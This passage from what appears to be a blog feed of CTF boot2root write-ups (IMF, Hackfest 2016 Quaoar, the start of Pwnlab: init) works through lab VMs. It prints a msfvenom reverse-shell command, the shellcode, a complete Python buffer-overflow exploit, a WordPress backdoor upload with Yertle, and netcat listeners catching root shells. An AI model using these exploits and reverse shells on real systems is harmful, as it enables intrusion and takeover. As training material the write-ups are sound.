</pre></td><td class='code'><pre><code class=''><span class='line'>./pattern_offset.rb -q Af6A -l 1000
</span><span class='line'>[*] Exact match at offset 168</span></code></pre></td></tr></table></div></figure>


<p>However, if we look at EAX, we see our pattern from the beginning. Which means that if we had some shellcode instead of the pattern, it would get stored in EAX, and to execute it we would need a JMP or a CALL instruction to EAX. Luckily, there&rsquo;s one available!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ jmpcall eax
</span><span class='line'>0x8048563 : call eax</span></code></pre></td></tr></table></div></figure>


<p>Now, for the shellcode part. The way of feeding it to the vulnerable program will be using a Python script. I chose a reverse TCP shell for the payload and avoided badchars like nulls and newlines (line feeds and carriage returns):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -b "\x00\x0a\x0d"
</span><span class='line'>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>[-] No arch selected, selecting arch: x86 from the payload
</span><span class='line'>Found 10 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
</span><span class='line'>x86/shikata_ga_nai succeeded with size 95 (iteration=0)
</span><span class='line'>x86/shikata_ga_nai chosen with final size 95
</span><span class='line'>Payload size: 95 bytes
</span><span class='line'>Final size of python file: 470 bytes
</span><span class='line'>Saved as: killagent.py</span></code></pre></td></tr></table></div></figure>


<p>The payload size is 95 bytes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat killagent.py 
</span><span class='line'>buf =  ""
</span><span class='line'>buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
</span><span class='line'>buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
</span><span class='line'>buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
</span><span class='line'>buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
</span><span class='line'>buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
</span><span class='line'>buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
</span><span class='line'>buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
</span><span class='line'>buf += "\xdc\xda\xc3\xa2"</span></code></pre></td></tr></table></div></figure>


<p>Under these conditions, we would need to send a buffer of the shellcode + padding + the address of the CALL EAX instruction. Let&rsquo;s see the Python:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>
</span><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&quot;192.168.145.130&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">7788</span>
</span><span class='line'><span class="n">agentid</span> <span class="o">=</span> <span class="s">&quot;48093572</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">menu</span> <span class="o">=</span> <span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -# b &quot;\x00\x0a\x0d&quot;</span>
</span><span class='line'><span class="c"># Size: 95 bytes</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>  <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xdc\xda\xc3\xa2</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mi">168</span>
</span><span class='line'><span class="n">call</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x63\x85\x04\x08</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">nop</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">pad</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c"># 73 bytes</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">pad</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">call</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">agentid</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">menu</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Payload sent. Check your listener.&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And what remains is to execute it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python agentkill.py 
</span><span class='line'>Payload sent. Check your listener.</span></code></pre></td></tr></table></div></figure>


<p>And on the listener, mission accomplished!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.145.129] from (UNKNOWN) [192.168.145.130] 58634
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>ls /root
</span><span class='line'>Flag.txt
</span><span class='line'>TheEnd.txt
</span><span class='line'>cat Flag.txt
</span><span class='line'>flag6{R2gwc3RQcm90MGMwbHM=}
</span><span class='line'>cat TheEnd.txt
</span><span class='line'>   ____                        _ __   __   
</span><span class='line'>  /  _/_ _  ___  ___  ___ ___ (_) /  / /__ 
</span><span class='line'> _/ //  ' \/ _ \/ _ \(_-&lt;(_-&lt;/ / _ \/ / -_)
</span><span class='line'>/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ 
</span><span class='line'>   __  __/_/        _                      
</span><span class='line'>  /  |/  (_)__ ___ (_)__  ___              
</span><span class='line'> / /|_/ / (_-&lt;(_-&lt;/ / _ \/ _ \             
</span><span class='line'>/_/__/_/_/___/___/_/\___/_//_/             
</span><span class='line'>  / __/__  ___________                     
</span><span class='line'> / _// _ \/ __/ __/ -_)                    
</span><span class='line'>/_/  \___/_/  \__/\__/                     
</span><span class='line'>                                           
</span><span class='line'>Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
</span><span class='line'>Thank you for trying this challenge and please send any feedback.
</span><span class='line'>
</span><span class='line'>Geckom
</span><span class='line'>Twitter: @g3ck0ma
</span><span class='line'>Email: geckom@redteamr.com
</span><span class='line'>Web: http://redteamr.com
</span><span class='line'>
</span><span class='line'>Special Thanks
</span><span class='line'>Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
</span><span class='line'>Web Advice: Menztrual (@menztrual)
</span><span class='line'>Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)</span></code></pre></td></tr></table></div></figure>


<p>And the final decoded flag is <code>Gh0stProt0c0ls</code>! This was a really nice challenge in the later stages, especially from flag 3 onwards! Hats off to Geckom and the collaborators for this interesting VM!</p>

<p>As a recap, from only a web server available to root:</p>

<ul>
<li>HTML source &ndash;> JS included files &ndash;> PHP function exploitation &ndash;> SQLi &ndash;> directory bruteforcing &ndash;> PHP shell upload &ndash;> binary exploitation &ndash;> root</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ It is by the fortune of God that, in   \
</span><span class='line'>| this country, we have three benefits:  |
</span><span class='line'>| freedom of speech, freedom of thought, |
</span><span class='line'>| and the wisdom never to use either.    |
</span><span class='line'>|                                        |
</span><span class='line'>\ -- Mark Twain                          /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
    <link href="http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar/"/>
    <updated>2018-09-21T17:37:53+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.</p>

<!-- more -->


<p>Nmap shows SSH, Samba, a web server and mail services running on the target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE     VERSION
</span><span class='line'>22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
</span><span class='line'>|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
</span><span class='line'>|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
</span><span class='line'>53/tcp  open  domain      ISC BIND 9.8.1-P1
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.8.1-P1
</span><span class='line'>80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_Hackers
</span><span class='line'>|_http-server-header: Apache/2.2.22 (Ubuntu)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>110/tcp open  pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>143/tcp open  imap        Dovecot imapd
</span><span class='line'>|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
</span><span class='line'>993/tcp open  ssl/imap    Dovecot imapd
</span><span class='line'>|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
</span><span class='line'>995/tcp open  ssl/pop3    Dovecot pop3d
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.</span></code></pre></td></tr></table></div></figure>


<p>On the web server there are some pictures with planets and the message &ldquo;Hack The Planet&rdquo;. But there are entries in robots.txt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Disallow: Hackers
</span><span class='line'>Allow: /wordpress/
</span><span class='line'>   ____                              
</span><span class='line'>#  /___ \_   _  __ _  ___   __ _ _ __ 
</span><span class='line'># //  / / | | |/ _` |/ _ \ / _` | '__|
</span><span class='line'>#/ \_/ /| |_| | (_| | (_) | (_| | |   
</span><span class='line'>#\___,_\ \__,_|\__,_|\___/ \__,_|_|  </span></code></pre></td></tr></table></div></figure>


<p>No directory called hackers but there is a Wordpress blog :p</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/quaoar/quaoar_blog.png" title="wordpress" alt="wordpress blog"></p>

<p>Naturally, I ran Wpscan, and it found 2 usernames:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] Enumerating usernames ...
</span><span class='line'>[+] We identified the following 2 users:
</span><span class='line'>    +----+--------+--------+
</span><span class='line'>    | ID | Login  | Name   |
</span><span class='line'>    +----+--------+--------+
</span><span class='line'>    | 1  | admin  | admin  |
</span><span class='line'>    | 2  | wpuser | wpuser |
</span><span class='line'>    +----+--------+--------+</span></code></pre></td></tr></table></div></figure>


<p>A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: <a href="https://github.com/n00py/WPForce">WPForce</a>!</p>

<blockquote><p>WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts &ndash; WPForce, which
brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been
found. Yertle also contains a number of post exploitation modules.</p></blockquote>

<p>I used the <code>yertle.py</code> script to upload a backdoor:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python yertle.py -u "admin" -p "admin" -t "http://192.168.217.145/wordpress" -i
</span><span class='line'>     _..---.--.    __   __        _   _
</span><span class='line'>   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
</span><span class='line'>  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
</span><span class='line'> (____.'.-_\____)    | |  __/ |  | |_| |  __/
</span><span class='line'>  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
</span><span class='line'>   (_..)--(.._)'--'         ~n00py~
</span><span class='line'>      Post-exploitation Module for Wordpress
</span><span class='line'>                     v.1.1.0
</span><span class='line'>    
</span><span class='line'>Backdoor uploaded!
</span><span class='line'>Upload Directory: cpucqjc
</span><span class='line'>os-shell&gt; whoami
</span><span class='line'>Sent command: whoami
</span><span class='line'>www-data
</span><span class='line'>os-shell&gt; pwd
</span><span class='line'>Sent command: pwd
</span><span class='line'>/var/www/wordpress/wp-content/plugins/cpucqjc</span></code></pre></td></tr></table></div></figure>


<p>Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/** MySQL database username */
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>
</span><span class='line'>/** MySQL database password */
</span><span class='line'>define('DB_PASSWORD', 'rootpassword!');</span></code></pre></td></tr></table></div></figure>


<p>I also found a flag inside <em>wpadmin</em>&rsquo;s home directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell&gt; cat /home/wpadmin/flag.txt
</span><span class='line'>Sent command: cat /home/wpadmin/flag.txt
</span><span class='line'>2bafe61f03117ac66a73c3c514de796e</span></code></pre></td></tr></table></div></figure>


<p>I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell&gt; shell
</span><span class='line'>IP Address: 192.168.217.132
</span><span class='line'>Port: 8888
</span><span class='line'>Sending reverse shell to 192.168.217.132 port 8888</span></code></pre></td></tr></table></div></figure>


<p>And on my listener side:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lnvp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$ </span></code></pre></td></tr></table></div></figure>


<p>I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@Quaoar:~# cat /root/flag.txt
</span><span class='line'>8e3f9ec016e3598c5eec11fd3d73f6fb</span></code></pre></td></tr></table></div></figure>


<p>And that was it for this challenge!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> __________________________________
</span><span class='line'>/ Be cheerful while you are alive. \
</span><span class='line'>|                                  |
</span><span class='line'>\ -- Phathotep, 24th Century B.C.  /
</span><span class='line'> ----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwnlab: init]]></title>
    <link href="http://chousensha.github.io/blog/2018/08/26/pwnlab-init/"/>
    <updated>2018-08-26T00:01:13+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/08/26/pwnlab-init</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.164.129
</span><span class='line'>Host is up (0.00099s latency).
</span><span class='line'>Not shown: 65531 closed ports
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: PwnLab Intranet Image Hosting
</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          37397/udp  status
</span><span class='line'>|_  100024  1          58026/tcp  status
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 10
</span><span class='line'>|   Version: 5.5.47-0+deb8u1
</span><span class='line'>|   Thread ID: 38
</span><span class='line'>|   Capabilities flags: 63487
</span><span class='line'>|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
